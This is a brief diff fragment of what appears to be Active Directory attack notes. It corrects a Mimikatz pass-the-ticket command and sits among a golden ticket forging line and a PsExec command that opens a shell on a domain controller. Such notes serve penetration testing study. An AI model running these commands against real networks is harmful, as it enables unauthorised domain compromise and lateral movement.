@@ -79,7 +79,7 @@ kerberos::golden /user:michael /domain:http://corp.com /sid:S-1-5-21-424464709-3
 
 # Inject ticket to memory
 C:\Tools> mimikatz.exe
-mimikatz # kerberos::ptt golden
+mimikatz # kerberos::ptt ticket.kirbi
 
 # PsExec to DC
 PsExec64.exe \\dc01 cmd.exe
